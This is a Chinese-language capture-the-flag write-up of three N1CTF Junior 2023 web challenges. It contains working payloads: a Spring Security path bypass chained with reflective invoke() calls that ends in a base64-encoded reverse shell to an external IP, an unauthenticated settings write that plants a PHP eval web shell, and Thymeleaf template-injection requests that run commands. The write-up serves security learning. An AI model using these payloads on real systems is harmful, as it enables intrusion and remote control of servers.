---
title: "2023 N1CTF Junior Web 部分 Writeup"
date: 2023-02-01T22:10:16+08:00
lastmod: 2023-02-01T22:10:16+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

有些题目感觉挺难的

不过两道 java 题都拿了一血我是真的没有想到...

<!--more-->

## ez_zudit

/controller/WebController.java

![image-20230201102015754](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011020868.png)

/config/SecurityConfig.java

![image-20230201101931831](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011019465.png)

`/admin` 路由没什么用, 猜测利用点在这个 `/test` 路由

配置了 Spring Security,  `/test` 路由需要 SCRIPT 角色才能访问

参考文章: [https://landgrey.me/blog/23/](https://landgrey.me/blog/23/)

访问 `/test/` 就可以绕过限制

![image-20230201102313594](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011023664.png)

剩下就是考虑如何利用这串代码进行 rce

```java
ZhtmlExecuteContext context = new ZhtmlExecuteContext(ZhtmlManagerContext.getInstance(), null, null);
TemplateCompiler jc = new TemplateCompiler(ZhtmlManagerContext.getInstance());
jc.compileSource(script);
TemplateExecutor je = jc.getExecutor();
je.execute(context);
```

发现来自 qqq 包, 而且网上没有任何相关资料, 于是自己就把它单独打包成了 jar 方便调试

![image-20230201102718525](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011027633.png)

先跟进 `jc.compileSourcce(script)`

![image-20230201102743621](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011027741.png)

跟进 `this.parser.parse()`

![image-20230201102836503](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011028615.png)

![image-20230201102848989](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011028096.png)

分别检查开头是否为 `<%` `<!` `<!--` `</` `${` `@{`, 然后调用对应的 `expectXX` 方法

其中 `expectXX` 有如下几种

```
expectScript
expectComment
expectTag
expectTagEnd
expectExpression
expectI18NString
```

这里关注 `expectScript` 和 `expectExpression`

一开始试的是 expectScript, 把 script 变量改成 `<% 123 %>` 然后重新调试一遍

![image-20230201103326610](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011033723.png)

![image-20230201103417697](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011034806.png)

parse 完了之后会调用 `this.compile(this.parser)`

![image-20230201103506711](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011035812.png)

![image-20230201103613812](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011036923.png)

将之前在 expectScript 中生成的 TemplateFragment 对象传入 compileNode 方法

![image-20230201103728948](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011037054.png)

根据 `tf.Type` 的值分别创建对应的对象, 添加至 parentList

结合之前的 expectXX 系列方法, 可以得到

```
tf.Type == 1 -> expectComment
tf.Type == 2 -> expectTag
tf.Type == 3 -> expectExpression
tf.Type == 4 -> expectScript
```

因为此时 `tf.Type == 4`, 所以会创建一个 PrintCommand 对象

![image-20230201104153370](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011041481.png)

这里先放着, 然后跟进 `je.execute(context)`

![image-20230201104319503](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011043615.png)

遍历 var5 并调用元素的 execute 方法

![image-20230201104354945](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011043055.png)

最终将 `this.str` 也就是 `<% 123 %>` 写入到输出流里面, 并没有类似代码执行的地方...

所以只能换条路, 利用 `expectExpression`

将 script 变量改成 `${123}` 然后重新调试一遍

![image-20230201104738143](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011047251.png)

跟进 expectExpression 方法

![image-20230201104813536](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011048649.png)

回到 comipleNode 方法

![image-20230201104854487](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011048594.png)

这里会创建 ExpressionCommand 对象

![image-20230201104940577](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011049681.png)

它的 execute 方法会调用 `context.evalExpression(this.expr)`

![image-20230201105029549](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011050656.png)

继续跟进

![image-20230201105119720](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011051838.png)

到这一步会先获取 FunctionMapper, 里面对应多个处理类

这些类可以在 `qqq.framework.expression.function` 中找到

先看 Eval 类

![image-20230201105330091](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011053202.png)

调用了 `context.evalExpression(input)`, 但实际上跟上面一样只是再走了一遍解析 expression 的流程, 这块也没有代码执行的地方

再看 Invoke 类

![image-20230201105536702](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011055818.png)

反射调用某个类的非静态 public 方法, 并且支持任意数量的参数 (包括无参)

所以利用点应该是在这块

然后回到之前的 evalExpression 方法, 跟进 `this.getManagerContext().getEvaluator().evaluate(expression, expectedClass, this, fm)`

![image-20230201110139037](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011101147.png)

![image-20230201110152520](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011101632.png)

创建了一个 ELParser, 但是实际测试下来好像并不是 EL 表达式的语句 (?)

![image-20230201110250122](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011102231.png)

这块跟进了一会发现它支持如下几种数据类型, 位于 `qqq.framework.thirdparty.el` 包

![image-20230201110459077](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011104107.png)

FunctionInvocation 会根据 functionName 来调用之前的 Eval Invoke 这些处理类

![image-20230201110621826](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011106922.png)

之后把 `script` 变量改成 `${invoke("1","2","3")}` 然后重新调试

跟进到 execute 方法的时候发现 `o` 的类型会变成 String (传入纯数字的话就是 Long), 所以 `o.getClass()` 的结果只会是 `String.class`

![image-20230201111143809](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011111922.png)

而且根据上面 `qqq.framework.thirdparty.el` 里面的几种数据类型得知不能够直接传入 Runtime, ProcessBuilder 或 Class 对象, 所以只能换成一种类似 ssti 的思路

先根据 `"123".getClass().getClass()` 拿到 `java.lang.Class` 对象, 然后调用 forName 方法加载得到相关类的 Class, 再进行利用

Runtime 类的 getRuntime 方法是个静态方法, 无法调用, 而且它的构造方法修饰符是 private, 也无法调用

ProcessBuilder 类的构造方法传入的是可变参数 `String... command`, 在这里调用的时候会爆 `java.lang.NoSuchMethodException`

最后找了一圈发现了 `javax.script.ScriptEngineManager`

常规调用方式

```java
(new ScriptEngineManager()).getEngineByExtension("js").eval("java.lang.Runtime.getRuntime().exec(\"calc\")");
```

改成 invoke 的形式

```
${invoke(invoke(invoke(invoke(invoke(invoke("123", "getClass"), "getClass"), "forName", "javax.script.ScriptEngineManager"), "newInstance"), "getEngineByExtension", "js"), "eval", "java.lang.Runtime.getRuntime().exec(\"calc\")")}
```

![image-20230201113610846](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011136950.png)

最终 payload

```
${invoke(invoke(invoke(invoke(invoke(invoke("123", "getClass"), "getClass"), "forName", "javax.script.ScriptEngineManager"), "newInstance"), "getEngineByExtension", "js"), "eval", "java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy43MC4yMzAvNjU0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}\")")}
```

![image-20230201113633210](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011136288.png)

反弹 shell 然后 `/readflag` 即可

## orrs

源码下载: [https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html](https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html)

/classes/SystemSettings.php

后台未授权修改系统设置

![image-20230201115006161](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011150273.png)

`file_put_contents` 处任意写文件, 但是限制后缀只能是 `.html`

然后发现 about\_us.php 和 home.php 分别包含了某个 html 文件

![image-20230201115232124](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011152226.png)

考虑将 php 代码写入 about_us.html 或 welcome.html, 然后访问这两个页面 getshell

然后发现题目服务器对这两个 html 没有写权限, 于是换个思路

利用 index.php 包含的 404.html

![image-20230201115336163](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011153267.png)

测试发现 404.html 有写权限

最终 payload

```
POST /classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 43.137.18.183:32961
Content-Length: 1543
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5emL5TBetpBt96A2
Origin: http://43.137.18.183:32959
Referer: http://43.137.18.183:32959/admin/?page=system_info
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=tlptqt5rs3imkk231qvakarl35
Connection: close

------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="name"

Online Railway Reservation System - PHP
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="short_name"

ORRS- PHP
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="content[welcome]"

<p style="margin-right: 0px; margin-bottom: 15px; padding: 0px;">Welcome to N1CTF Juinor:)</p>
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="content[404]"

<?php phpinfo();eval($_REQUEST[1]);?>
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="email"

info@railway.com
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="contact"

09854698789 / 78945632
------WebKitFormBoundary5emL5TBetpBt96A2
Content-Disposition: form-data; name="address"

XYZ Street, There City, Here, 2306
------WebKitFormBoundary5emL5TBetpBt96A2--

```

![image-20230201115553946](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011155043.png)

访问 `/index.php?page=xxx` 即可 getshell

## template

springboot 1.4.1 + thymeleaf 2.1.5

后台弱口令 root/root

根据题目名称猜测思路是 thymeleaf ssti

参考文章: [https://www.anquanke.com/post/id/254519](https://www.anquanke.com/post/id/254519)

有两种利用点, 一种是 return 语句部分可控, 另一种是方法返回值为 void, 但是传入的参数可控, 并且没有使用 `@ResponseBody` 注解

查找后发现 `com.admin.interfaces.web.UserController#logout` 方法

![image-20230201120512164](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011205305.png)

利用时需要先登录一次拿到 cookie, 然后再访问 /user/logout

测试发现题目环境不出网, 无法反弹 shell, 所以改成可回显的 payload

```
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::..
```

![image-20230201121420051](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011214149.png)

发现并没有回显命令执行结果, 这是因为 `com.admin.interfaces.web.PublicAdvice` 对异常进行了处理, 然后输出了自定义的错误页面 (不过实际上好像并没有显示 thymeleaf 的异常信息)

![image-20230201120938293](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011209429.png)

将 Accept 头删掉就可以得到回显

![image-20230201121149549](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011211624.png)

最终 payload

```
GET /user/logout?page=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22/readflag%22).getInputStream()).next()%7d__::.. HTTP/1.1
Host: 1.13.81.130:32835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70
Referer: http://1.13.81.130:32835/menu
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: remember-me=cm9vdDoxNjc2MzU5ODcwMjA4OmI0ZWZiZGMyNTI1MWYyM2FkNGQyMGE0YjIwN2U3OTdm; SESSION=cb68e944-997b-4973-a54f-06d8a545d6f3
Connection: close


```

![image-20230201121224604](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202302011212679.png)
